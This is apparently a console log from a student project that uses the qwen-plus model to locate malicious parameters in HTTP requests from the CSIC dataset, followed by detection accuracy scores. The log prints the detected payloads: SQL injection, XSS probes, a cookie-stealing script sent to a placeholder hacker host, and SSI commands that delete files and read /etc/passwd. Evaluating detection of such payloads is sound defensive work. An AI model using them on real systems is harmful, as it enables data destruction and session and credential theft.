@@ -1,0 +1,119 @@
+PS C:\Users\LinSongjian\Fastask\SoftwareSecurityAnalysis\Project\MaliciousPayloadLocationAndWAFGenerater> & c:/Users/LinSongjian/Fastask/SoftwareSecurityAnalysis/Project/MaliciousPayloadLocationAndWAFGenerater/venv/Scripts/python.exe c:/Users/LinSongjian/Fastask/SoftwareSecurityAnalysis/Project/MaliciousPayloadLocationAndWAFGenerater/llm_locator.py
+[Info] 开始调用 qwen-plus 进行恶意载荷定位...
+[Info] 共计需处理请求数量: 100
+
+    [Info] ID:CSIC_normal_0 未检测到异常载荷。
+    [Info] ID:CSIC_normal_3 未检测到异常载荷。
+    [Info] ID:CSIC_normal_4 未检测到异常载荷。
+    [Info] ID:CSIC_normal_2 未检测到异常载荷。
+    [Info] ID:CSIC_normal_1 未检测到异常载荷。
+    [Info] ID:CSIC_normal_5 未检测到异常载荷。
+    [Info] ID:CSIC_normal_6 未检测到异常载荷。
+    [Info] ID:CSIC_normal_7 未检测到异常载荷。
+    [Info] ID:CSIC_normal_8 未检测到异常载荷。
+    [Info] ID:CSIC_normal_9 未检测到异常载荷。
+    [Info] ID:CSIC_normal_10 未检测到异常载荷。
+    [Info] ID:CSIC_normal_13 未检测到异常载荷。
+    [Info] ID:CSIC_normal_11 未检测到异常载荷。
+    [Info] ID:CSIC_normal_12 未检测到异常载荷。
+    [Info] ID:CSIC_normal_14 未检测到异常载荷。
+    [Info] ID:CSIC_normal_16 未检测到异常载荷。
+    [Info] ID:CSIC_normal_17 未检测到异常载荷。
+    [Info] ID:CSIC_normal_18 未检测到异常载荷。
+    [Info] ID:CSIC_normal_15 未检测到异常载荷。
+    [Info] ID:CSIC_normal_19 未检测到异常载荷。
+    [Info] ID:CSIC_normal_20 未检测到异常载荷。
+    [Info] ID:CSIC_normal_21 未检测到异常载荷。
+    [Info] ID:CSIC_normal_22 未检测到异常载荷。
+    [Info] ID:CSIC_normal_23 未检测到异常载荷。
+    [Info] ID:CSIC_normal_24 未检测到异常载荷。
+    [Info] ID:CSIC_normal_25 未检测到异常载荷。
+    [Info] ID:CSIC_normal_28 未检测到异常载荷。
+    [Info] ID:CSIC_normal_29 未检测到异常载荷。
+    [Info] ID:CSIC_normal_26 未检测到异常载荷。
+    [Info] ID:CSIC_normal_27 未检测到异常载荷。
+    [Info] ID:CSIC_normal_30 未检测到异常载荷。
+    [Info] ID:CSIC_normal_31 未检测到异常载荷。
+    [Info] ID:CSIC_normal_32 未检测到异常载荷。
+    [Info] ID:CSIC_normal_33 未检测到异常载荷。
+    [Info] ID:CSIC_normal_34 未检测到异常载荷。
+    [Info] ID:CSIC_normal_35 未检测到异常载荷。
+    [Info] ID:CSIC_normal_36 未检测到异常载荷。
+    [Info] ID:CSIC_normal_37 未检测到异常载荷。
+    [Info] ID:CSIC_normal_38 未检测到异常载荷。
+    [Info] ID:CSIC_normal_39 未检测到异常载荷。
+    [Info] ID:CSIC_normal_40 未检测到异常载荷。
+    [Info] ID:CSIC_normal_41 未检测到异常载荷。
+    [Info] ID:CSIC_normal_43 未检测到异常载荷。
+    [Info] ID:CSIC_normal_42 未检测到异常载荷。
+    [Info] ID:CSIC_normal_44 未检测到异常载荷。
+    [Info] ID:CSIC_normal_45 未检测到异常载荷。
+    [Info] ID:CSIC_normal_46 未检测到异常载荷。
+    [Info] ID:CSIC_normal_49 未检测到异常载荷。
+    [Info] ID:CSIC_normal_47 未检测到异常载荷。
+    [Info] ID:CSIC_normal_48 未检测到异常载荷。
+    [Info] ID:CSIC_anomalous_0 识别到恶意参数: ['cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25']
+    [Info] ID:CSIC_anomalous_1 识别到恶意参数: ['cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25']
+    [Info] ID:CSIC_anomalous_17 未检测到异常载荷。
+    [Info] ID:CSIC_anomalous_5 识别到恶意参数: ['login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org']
+    [Info] ID:CSIC_anomalous_6 识别到恶意参数: ['login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org']
+    [Info] ID:CSIC_anomalous_18 识别到恶意参数: ['precio=183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
+    [Info] ID:CSIC_anomalous_19 识别到恶意参数: ['precio=183%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
+    [Info] ID:CSIC_anomalous_25 识别到恶意参数: ['modo=registro%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E']
+    [Info] ID:CSIC_anomalous_26 识别到恶意参数: ['modo=registro%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E']
+    [Info] ID:CSIC_anomalous_45 识别到恶意参数: ['ntc=4096797311989091sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E']
+    [Info] ID:CSIC_anomalous_55 识别到恶意参数: ['cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org']
+    [Info] ID:CSIC_anomalous_46 识别到恶意参数: ['ntc=4096797311989091sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E']
+    [Info] ID:CSIC_anomalous_56 识别到恶意参数: ['cantidad=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org']
+    [Info] ID:CSIC_anomalous_63 识别到恶意参数: ['login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
+    [Info] ID:CSIC_anomalous_64 识别到恶意参数: ['login=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
+    [Info] ID:CSIC_anomalous_65 未检测到异常载荷。
+    [Info] ID:CSIC_anomalous_66 未检测到异常载荷。
+    [Info] ID:CSIC_anomalous_77 识别到恶意参数: ['errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
+    [Info] ID:CSIC_anomalous_78 识别到恶意参数: ['errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
+    [Info] ID:CSIC_anomalous_79 识别到恶意参数: ['errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C']
+    [Info] ID:CSIC_anomalous_80 识别到恶意参数: ['errorMsg=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C']
+    [Info] ID:CSIC_anomalous_92 识别到恶意参数: ['password=8a9c27%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
+    [Info] ID:CSIC_anomalous_98 识别到恶意参数: ['B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
+    [Info] ID:CSIC_anomalous_93 识别到恶意参数: ['password=8a9c27%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
+    [Info] ID:CSIC_anomalous_94 未检测到异常载荷。
+    [Info] ID:CSIC_anomalous_95 未检测到异常载荷。
+    [Info] ID:CSIC_anomalous_113 识别到恶意参数: ['http://localhost:8080/scripts/tools/mkilog.exe']
+    [Info] ID:CSIC_anomalous_99 识别到恶意参数: ['B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org']
+    [Info] ID:CSIC_anomalous_143 识别到恶意参数: ['B2=Vaciar+carritoparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29']
+    [Info] ID:CSIC_anomalous_136 识别到恶意参数: ['apellidos=Guimera+Faraco%22+AND+%221%22%3D%221']
+    [Info] ID:CSIC_anomalous_137 识别到恶意参数: ['apellidos=Guimera+Faraco%22+AND+%221%22%3D%221']
+    [Info] ID:CSIC_anomalous_144 识别到恶意参数: ['B2=Vaciar+carritoparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29']
+    [Info] ID:CSIC_anomalous_167 识别到恶意参数: ['modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25']
+    [Info] ID:CSIC_anomalous_168 识别到恶意参数: ['modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25']
+    [Info] ID:CSIC_anomalous_169 识别到恶意参数: ['pwd=%2C%27caire']
+    [Info] ID:CSIC_anomalous_170 识别到恶意参数: ['pwd=%2C%27caire']
+    [Info] ID:CSIC_anomalous_203 识别到恶意参数: ['nombre=%27+AND+%271%27%3D%271']
+    [Info] ID:CSIC_anomalous_204 识别到恶意参数: ['nombre=%27+AND+%271%27%3D%271']
+    [Info] ID:CSIC_anomalous_213 识别到恶意参数: ['id=1%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
+    [Info] ID:CSIC_anomalous_214 识别到恶意参数: ['id=1%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
+    [Info] ID:CSIC_anomalous_226 识别到恶意参数: ['apellidos=Laspiur%27+AND+%271%27%3D%271']
+    [Info] ID:CSIC_anomalous_227 识别到恶意参数: ['apellidos=Laspiur%27+AND+%271%27%3D%271']
+    [Info] ID:CSIC_anomalous_230 识别到恶意参数: ['dni=52%2763986G']
+    [Info] ID:CSIC_anomalous_235 识别到恶意参数: ['B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E']
+    [Info] ID:CSIC_anomalous_231 识别到恶意参数: ['dni=52%2763986G']
+    [Info] ID:CSIC_anomalous_236 识别到恶意参数: ['B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E']
+    [Info] ID:CSIC_anomalous_246 识别到恶意参数: ['login=kh%27ez%3Fri']
+    [Info] ID:CSIC_anomalous_251 识别到恶意参数: ['id=2%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
+    [Info] ID:CSIC_anomalous_247 识别到恶意参数: ['login=kh%27ez%3Fri']
+    [Info] ID:CSIC_anomalous_252 识别到恶意参数: ['id=2%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--']
+
+[Info] 任务结束。成功生成 100 条结果。
+[Info] 总耗时: 152.33 秒！
+[Info] 数据已保存至: .\llm_output\llm_predicted_results.json
+
+PS C:\Users\LinSongjian\Fastask\SoftwareSecurityAnalysis\Project\MaliciousPayloadLocationAndWAFGenerater> & c:/Users/LinSongjian/Fastask/SoftwareSecurityAnalysis/Project/MaliciousPayloadLocationAndWAFGenerater/venv/Scripts/python.exe c:/Users/LinSongjian/Fastask/SoftwareSecurityAnalysis/Project/MaliciousPayloadLocationAndWAFGenerater/llm_predicted_results_analysis.py
+Total Processed: 100
+True Positives (TP): 45
+True Negatives (TN): 50
+False Positives (FP): 0
+False Negatives (FN): 5
+--------------------
+Accuracy:  95.00%
+Precision: 100.00%
+Recall:    90.00%
